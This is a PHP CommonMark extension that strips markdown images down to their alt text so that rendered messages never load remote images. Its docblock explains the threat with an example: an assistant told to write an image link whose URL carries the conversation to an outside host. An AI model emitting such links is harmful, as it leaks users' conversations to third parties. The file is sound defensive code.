<?php

namespace Jiannius\Atom\Tiptap;

use League\CommonMark\Environment\EnvironmentBuilderInterface;
use League\CommonMark\Event\DocumentParsedEvent;
use League\CommonMark\Extension\CommonMark\Node\Inline\Image;
use League\CommonMark\Extension\ExtensionInterface;

/**
 * Turns every markdown image into its alt text before it is rendered. An image in a message is a request the viewer's
 * browser makes to an address the author chose, which is a way to send what the page shows to a third party (an
 * assistant that was told to write `![](https://host/?q=<the conversation>)`), so markdown text never loads one.
 * Reference-style images (`![alt][ref]`) are the same node and go the same way.
 */
class MarkdownTextImages implements ExtensionInterface
{
    /**
     * Listen for the parsed document.
     */
    public function register(EnvironmentBuilderInterface $environment): void
    {
        $environment->addEventListener(DocumentParsedEvent::class, static function (DocumentParsedEvent $event): void {
            $images = [];

            foreach ($event->getDocument()->iterator() as $node) {
                if ($node instanceof Image) {
                    $images[] = $node;
                }
            }

            foreach ($images as $image) {
                foreach ($image->children() as $child) {
                    $image->insertBefore($child);
                }

                $image->detach();
            }
        });
    }
}
